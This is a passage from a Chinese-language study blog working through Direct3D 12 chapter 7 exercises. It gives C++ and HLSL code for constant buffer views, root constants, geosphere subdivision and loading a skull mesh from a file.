    cbvHeapDesc<span class="token punctuation">.</span>Flags <span class="token operator">=</span> D3D12_DESCRIPTOR_HEAP_FLAG_SHADER_VISIBLE<span class="token punctuation">;</span>
    cbvHeapDesc<span class="token punctuation">.</span>NodeMask <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token function">ThrowIfFailed</span><span class="token punctuation">(</span>md3dDevice<span class="token operator">-></span><span class="token function">CreateDescriptorHeap</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cbvHeapDesc<span class="token punctuation">,</span>
        <span class="token function">IID_PPV_ARGS</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mCbvHeap<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">/*
第四步：对每一个帧资源，使用 Resource() 获得 ID3D12Resource* objectCB，然后通过，GetGPUVirtualAddress() 循环获得D3D12_GPU_VIRTUAL_ADDRESS cbAddress，修改到对应数据的偏移位置处，

UploadBuffer::Resource(...)->ID3D12Resource*
ID3D12Resource::GetGPUVirtualAddress(...)->D3D12_GPU_VIRTUAL_ADDRESS

再把 cbAddress 偏移到不同物体的上，对每一个物体（用 heapIndex 指明是哪个物体），获取 handle 再配置 cbvDesc（其中包含有 cbAddress 确保偏移） 创建 cbv

CD3DX12_CPU_DESCRIPTOR_HANDLE->CD3DX12_CPU_DESCRIPTOR_HANDLE
ID3D12Device->CreateConstantBufferView(&amp;cbvDesc, handle)
*/</span>
<span class="token keyword">void</span> <span class="token class-name">ShapesApp</span><span class="token double-colon punctuation">::</span><span class="token function">BuildConstantBufferViews</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    UINT objCBByteSize <span class="token operator">=</span> d3dUtil<span class="token double-colon punctuation">::</span><span class="token function">CalcConstantBufferByteSize</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>ObjectConstants<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    UINT objCount <span class="token operator">=</span> <span class="token punctuation">(</span>UINT<span class="token punctuation">)</span>mOpaqueRitems<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Need a CBV descriptor for each object for each frame resource.</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> frameIndex <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> frameIndex <span class="token operator">&lt;</span> gNumFrameResources<span class="token punctuation">;</span> <span class="token operator">++</span>frameIndex<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">auto</span> objectCB <span class="token operator">=</span> mFrameResources<span class="token punctuation">[</span>frameIndex<span class="token punctuation">]</span><span class="token operator">-></span>ObjectCB<span class="token operator">-></span><span class="token function">Resource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span><span class="token punctuation">(</span>UINT i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> objCount<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            D3D12_GPU_VIRTUAL_ADDRESS cbAddress <span class="token operator">=</span> objectCB<span class="token operator">-></span><span class="token function">GetGPUVirtualAddress</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token comment">// Offset to the ith object constant buffer in the buffer.</span>
            cbAddress <span class="token operator">+=</span> i<span class="token operator">*</span>objCBByteSize<span class="token punctuation">;</span>

            <span class="token comment">// Offset to the object cbv in the descriptor heap.</span>
            <span class="token keyword">int</span> heapIndex <span class="token operator">=</span> frameIndex<span class="token operator">*</span>objCount <span class="token operator">+</span> i<span class="token punctuation">;</span>
            <span class="token keyword">auto</span> handle <span class="token operator">=</span> <span class="token function">CD3DX12_CPU_DESCRIPTOR_HANDLE</span><span class="token punctuation">(</span>mCbvHeap<span class="token operator">-></span><span class="token function">GetCPUDescriptorHandleForHeapStart</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            handle<span class="token punctuation">.</span><span class="token function">Offset</span><span class="token punctuation">(</span>heapIndex<span class="token punctuation">,</span> mCbvSrvUavDescriptorSize<span class="token punctuation">)</span><span class="token punctuation">;</span>

            D3D12_CONSTANT_BUFFER_VIEW_DESC cbvDesc<span class="token punctuation">;</span>
            cbvDesc<span class="token punctuation">.</span>BufferLocation <span class="token operator">=</span> cbAddress<span class="token punctuation">;</span>
            cbvDesc<span class="token punctuation">.</span>SizeInBytes <span class="token operator">=</span> objCBByteSize<span class="token punctuation">;</span>

            md3dDevice<span class="token operator">-></span><span class="token function">CreateConstantBufferView</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cbvDesc<span class="token punctuation">,</span> handle<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">//...</span>
    <span class="token comment">//...</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">/*
第五步:还需要最终的绑定，需要 gpu 去执行指令（不知道可不可以这么理解）
*/</span>
<span class="token keyword">void</span> <span class="token class-name">ShapesApp</span><span class="token double-colon punctuation">::</span><span class="token function">DrawRenderItems</span><span class="token punctuation">(</span>ID3D12GraphicsCommandList<span class="token operator">*</span> cmdList<span class="token punctuation">,</span> <span class="token keyword">const</span> std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span>RenderItem<span class="token operator">*</span><span class="token operator">></span><span class="token operator">&amp;</span> ritems<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    UINT objCBByteSize <span class="token operator">=</span> d3dUtil<span class="token double-colon punctuation">::</span><span class="token function">CalcConstantBufferByteSize</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>ObjectConstants<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
	<span class="token keyword">auto</span> objectCB <span class="token operator">=</span> mCurrFrameResource<span class="token operator">-></span>ObjectCB<span class="token operator">-></span><span class="token function">Resource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// For each render item...</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span>size_t i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> ritems<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">auto</span> ri <span class="token operator">=</span> ritems<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>

        cmdList<span class="token operator">-></span><span class="token function">IASetVertexBuffers</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>ri<span class="token operator">-></span>Geo<span class="token operator">-></span><span class="token function">VertexBufferView</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        cmdList<span class="token operator">-></span><span class="token function">IASetIndexBuffer</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ri<span class="token operator">-></span>Geo<span class="token operator">-></span><span class="token function">IndexBufferView</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        cmdList<span class="token operator">-></span><span class="token function">IASetPrimitiveTopology</span><span class="token punctuation">(</span>ri<span class="token operator">-></span>PrimitiveType<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// Offset to the CBV in the descriptor heap for this object and for this frame resource.</span>
        UINT cbvIndex <span class="token operator">=</span> mCurrFrameResourceIndex<span class="token operator">*</span><span class="token punctuation">(</span>UINT<span class="token punctuation">)</span>mOpaqueRitems<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> ri<span class="token operator">-></span>ObjCBIndex<span class="token punctuation">;</span>
        <span class="token keyword">auto</span> cbvHandle <span class="token operator">=</span> <span class="token function">CD3DX12_GPU_DESCRIPTOR_HANDLE</span><span class="token punctuation">(</span>mCbvHeap<span class="token operator">-></span><span class="token function">GetGPUDescriptorHandleForHeapStart</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        cbvHandle<span class="token punctuation">.</span><span class="token function">Offset</span><span class="token punctuation">(</span>cbvIndex<span class="token punctuation">,</span> mCbvSrvUavDescriptorSize<span class="token punctuation">)</span><span class="token punctuation">;</span>

        cmdList<span class="token operator">-></span><span class="token function">SetGraphicsRootDescriptorTable</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> cbvHandle<span class="token punctuation">)</span><span class="token punctuation">;</span>

        cmdList<span class="token operator">-></span><span class="token function">DrawIndexedInstanced</span><span class="token punctuation">(</span>ri<span class="token operator">-></span>IndexCount<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> ri<span class="token operator">-></span>StartIndexLocation<span class="token punctuation">,</span> ri<span class="token operator">-></span>BaseVertexLocation<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">// 上面的顺序也能替换一下，BuildRootSignature() 放后面一点也没事。</span>
<span class="token comment">// 最后保持映射状态，直接 CopyData 就好了，不断更新。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="7-9-1"><a href="#7-9-1" class="headerlink" title="7.9.1"></a>7.9.1</h3><p>Modify the “Shape” demo to use GeometryGenerator::CreateGeosphere instead of GeometryGenerator::CreateSphere. Try with 0, 1, 2, and 3 subdivision levels</p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// GeometryGenerator::MeshData GeometryGenerator::CreateGeosphere(float radius, uint32 numSubdivisions)</span>
GeometryGenerator<span class="token double-colon punctuation">::</span>MeshData sphere <span class="token operator">=</span> geoGen<span class="token punctuation">.</span><span class="token function">CreateGeosphere</span><span class="token punctuation">(</span><span class="token number">0.5f</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//以下分别为0，1，2，3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/image-20220315184610201.png" alt="image-20220315184610201"><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/image-20220315184900170.png" alt="image-20220315184900170"><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/image-20220315185018939.png" alt="image-20220315185018939"><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/image-20220315185143381.png" alt="image-20220315185143381"></p>
<p>细分调很高的话会有一部分看不见了，尚未找到原因<img src="https://cdn.jsdelivr.net/gh/wr-web/picture/image-20220315185238091.png" alt="image-20220315185238091"></p>
<h3 id="7-9-2"><a href="#7-9-2" class="headerlink" title="7.9.2"></a>7.9.2</h3><p>Modify the “Shapes” demo to use sixteen root constants to set the per-object world matrix instead of a descriptor table</p>
<p>我就说我看完了这一章有些东西真的只是看看过，知识没有进脑子，这练习多是一件美事啊啊哈哈哈哈…</p>
<p>服了，他的坐标系，i，j 和我理解的不太一样，画出来就异常的不对劲。</p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/*
前面的任务就是删掉第一个 CB，CBV 等。修改根签名。看了别人的做法，特意修改了 ObjectCB，其实没有必要，因为是常量，不需要每次去修改，赋值

gWorld,按照我的理解，应该是竖向的填充。
*/</span>


<span class="token keyword">float</span> srcData<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
            ri<span class="token operator">-></span><span class="token function">World</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  ri<span class="token operator">-></span><span class="token function">World</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ri<span class="token operator">-></span><span class="token function">World</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ri<span class="token operator">-></span><span class="token function">World</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            ri<span class="token operator">-></span><span class="token function">World</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  ri<span class="token operator">-></span><span class="token function">World</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ri<span class="token operator">-></span><span class="token function">World</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ri<span class="token operator">-></span><span class="token function">World</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            ri<span class="token operator">-></span><span class="token function">World</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  ri<span class="token operator">-></span><span class="token function">World</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ri<span class="token operator">-></span><span class="token function">World</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ri<span class="token operator">-></span><span class="token function">World</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            ri<span class="token operator">-></span><span class="token function">World</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  ri<span class="token operator">-></span><span class="token function">World</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ri<span class="token operator">-></span><span class="token function">World</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ri<span class="token operator">-></span><span class="token function">World</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
            
cmdList<span class="token operator">-></span><span class="token function">SetGraphicsRoot32BitConstants</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> srcData<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//color.hlsl</span>
<span class="token comment">/*
这个没什么好改的
*/</span>
cbuffer cbPerObject <span class="token operator">:</span> <span class="token keyword">register</span><span class="token punctuation">(</span>b0<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	float4x4 gWorld<span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token comment">// 花了几个小时，就因为这个顺序。。。还得是动调</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="7-9-3"><a href="#7-9-3" class="headerlink" title="7.9.3"></a>7.9.3</h3><p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/image-20220316125456736.png" alt="image-20220316125456736"></p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/image-20220316123341882.png" alt="image-20220316123341882"></p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/*
Summary:  从一定格式的文件中读取顶点和索引
Parameters:
	path: 路径
	numSubdivisions: 细分次数,似乎这个图像不太能继续细分了
*/</span>

MeshData <span class="token function">CreateFromFile</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> path<span class="token punctuation">,</span> uint32 numSubdivisions<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

GeometryGenerator<span class="token double-colon punctuation">::</span>MeshData <span class="token class-name">GeometryGenerator</span><span class="token double-colon punctuation">::</span><span class="token function">CreateFromFile</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> path<span class="token punctuation">,</span> uint32 numSubdivisions<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	MeshData meshData<span class="token punctuation">;</span>
	<span class="token keyword">float</span> pos<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">float</span> normal<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">uint32_t</span> tlist<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">char</span> mystr<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">uint64_t</span> vertexCount<span class="token punctuation">;</span>
	<span class="token keyword">uint64_t</span> triangleCount<span class="token punctuation">;</span>

	std<span class="token double-colon punctuation">::</span>ifstream <span class="token function">infile</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> std<span class="token double-colon punctuation">::</span>ios<span class="token double-colon punctuation">::</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>infile<span class="token punctuation">.</span><span class="token function">is_open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
		infile <span class="token operator">>></span> mystr <span class="token operator">>></span> vertexCount<span class="token punctuation">;</span>
		infile <span class="token operator">>></span> mystr <span class="token operator">>></span> triangleCount<span class="token punctuation">;</span>

		infile<span class="token punctuation">.</span><span class="token function">getline</span><span class="token punctuation">(</span>mystr<span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		infile<span class="token punctuation">.</span><span class="token function">getline</span><span class="token punctuation">(</span>mystr<span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		infile<span class="token punctuation">.</span><span class="token function">getline</span><span class="token punctuation">(</span>mystr<span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token keyword">while</span> <span class="token punctuation">(</span>vertexCount<span class="token operator">--</span><span class="token punctuation">)</span>
		<span class="token punctuation">&#123;</span>
			infile <span class="token operator">>></span> pos<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> infile <span class="token operator">>></span> pos<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> infile <span class="token operator">>></span> pos<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
			infile <span class="token operator">>></span> normal<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> infile <span class="token operator">>></span> normal<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> infile <span class="token operator">>></span> normal<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
			Vertex vertex <span class="token operator">=</span> <span class="token function">Vertex</span><span class="token punctuation">(</span>
				pos<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> pos<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> pos<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
				normal<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> normal<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> normal<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
				<span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">0.0f</span><span class="token punctuation">,</span> <span class="token number">0.0f</span><span class="token punctuation">,</span>
				<span class="token number">0.0f</span><span class="token punctuation">,</span> <span class="token number">0.0f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			meshData<span class="token punctuation">.</span>Vertices<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>vertex<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>

		infile<span class="token punctuation">.</span><span class="token function">getline</span><span class="token punctuation">(</span>mystr<span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		infile<span class="token punctuation">.</span><span class="token function">getline</span><span class="token punctuation">(</span>mystr<span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		infile<span class="token punctuation">.</span><span class="token function">getline</span><span class="token punctuation">(</span>mystr<span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		infile<span class="token punctuation">.</span><span class="token function">getline</span><span class="token punctuation">(</span>mystr<span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token keyword">while</span> <span class="token punctuation">(</span>triangleCount<span class="token operator">--</span><span class="token punctuation">)</span>
		<span class="token punctuation">&#123;</span>
			infile <span class="token operator">>></span> tlist<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">>></span> tlist<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">>></span> tlist<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
			meshData<span class="token punctuation">.</span>Indices32<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>tlist<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			meshData<span class="token punctuation">.</span>Indices32<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>tlist<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			meshData<span class="token punctuation">.</span>Indices32<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>tlist<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>

		infile<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> numSubdivisions<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token function">Subdivide</span><span class="token punctuation">(</span>meshData<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token keyword">return</span> meshData<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后要修改一下 BuildShapeGeometry</p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">GeometryGenerator<span class="token double-colon punctuation">::</span>MeshData skull <span class="token operator">=</span> geoGen<span class="token punctuation">.</span><span class="token function">CreateFromFile</span><span class="token punctuation">(</span><span class="token string">"C:\\Users\\orz10\\ROOT\\directx12\\d3d12book\\Chapter 7 Drawing in Direct3D Part II\\Shapes\\skull.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//...</span>
UINT skullIndexOffset <span class="token operator">=</span> cylinderIndexOffset <span class="token operator">+</span> <span class="token punctuation">(</span>UINT<span class="token punctuation">)</span>cylinder<span class="token punctuation">.</span>Indices32<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//...</span>
SubmeshGeometry skullSubmesh<span class="token punctuation">;</span>
skullSubmesh<span class="token punctuation">.</span>IndexCount <span class="token operator">=</span> <span class="token punctuation">(</span>UINT<span class="token punctuation">)</span>skull<span class="token punctuation">.</span>Indices32<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
skullSubmesh<span class="token punctuation">.</span>StartIndexLocation <span class="token operator">=</span> skullIndexOffset<span class="token punctuation">;</span>
skullSubmesh<span class="token punctuation">.</span>BaseVertexLocation <span class="token operator">=</span> skullVertexOffset<span class="token punctuation">;</span>
<span class="token comment">//...</span>
<span class="token keyword">auto</span> totalVertexCount <span class="token operator">=</span>
    box<span class="token punctuation">.</span>Vertices<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span>
    grid<span class="token punctuation">.</span>Vertices<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span>
    sphere<span class="token punctuation">.</span>Vertices<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span>
    cylinder<span class="token punctuation">.</span>Vertices<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span>
    skull<span class="token punctuation">.</span>Vertices<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//来一手黑色骨头，我发现白色的更带劲</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span>size_t i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> skull<span class="token punctuation">.</span>Vertices<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">,</span> <span class="token operator">++</span>k<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    vertices<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>Pos <span class="token operator">=</span> skull<span class="token punctuation">.</span>Vertices<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>Position<span class="token punctuation">;</span>
